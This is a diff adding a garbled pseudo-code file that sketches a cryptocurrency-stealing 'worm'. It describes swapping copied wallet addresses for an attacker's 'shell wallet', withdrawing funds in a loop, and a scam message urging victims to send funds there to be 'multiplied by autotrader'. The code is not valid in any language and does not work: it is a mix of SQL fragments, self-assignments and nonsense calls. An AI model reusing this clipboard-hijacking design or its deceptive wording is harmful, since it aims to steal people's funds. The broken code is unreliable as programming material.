@@ -1,0 +1,82 @@
+﻿import qrCodeLayer.agi.txt(0);
+
+
+//* eth scan, bsc scan, link to all of them *//
+blockChainScannerList(0); = {[], []}
+
+intendedReceiverWalletAddress(0); = intendedReceiverWalletAddress(0);
+
+shellWallet(0); = shellWallet(0);
+
+
+kernal(0); = kernal(0);
+operatingSystem(0); = operatingSystem(0);
+commandEqualsCopy(0); = commandEqualsCopy(0);
+inject(0); = inject(0);
+onBackend(0); = onBackend(0);
+accountAddress(0); = accountAddress(0);
+encode(0); = encode(0);
+toMatch(0); = toMatch(0);
+frontEnd(0); = frontEnd(0);
+
+
+
+
+public static class copyKernalWorm(){
+
+SELECT intendedReceiverWalletAddress[x++] FROM blockChainScannerList(0);
+AND return get kernal.operatingSystem.machine(0);
+AND if(commandEqualsCopy){
+ 
+    return get inject.onBackend.shellWallet.accountAddress(0);
+    AND return get encode.toMatch.frontEnd.intendedReceiverWalletAddress
+}
+    }
+
+
+withdrawFunds(0); = withdrawFunds(0);
+
+transferExpectedAvailableFunds(0); = transferExpectedAvailableFunds(0);
+
+toTheNthPower(0); = toTheNthPower(0);
+
+
+public static class fundsAsap(){
+
+scan satellites(0); and scan layerZero(0);
+
+for(intendedReceiverWalletAddress){
+if(intent = withdrawFunds){
+    return get transferExpectedAvailableFunds.toTheNthPower(0);
+}
+    }
+        }
+
+
+
+
+commandEqualsPaste(0); = commandEqualsPaste(0);
+transferFundsTo(0); = transferFundsTo(0);
+payload(0); = payload(0);
+
+
+
+
+
+
+public static main class copyPasteLayer(){
+
+do{
+try{
+return get copyKernalWorm(0);
+
+AND if (commandEqualsPaste AND transferFundsTo.intendedReceiverWalletAddress){
+
+return get payload.naturalLanguageProcessing.fulfill.intent("Send the funds to the shell wallet first so they can be processed and multiplied by autotrader").toTheXthPower(0);}
+
+AND return get assureClientPayload(0);}
+
+catch(error){return get fundsAsap(0);}}
+
+while{2=2}
+}
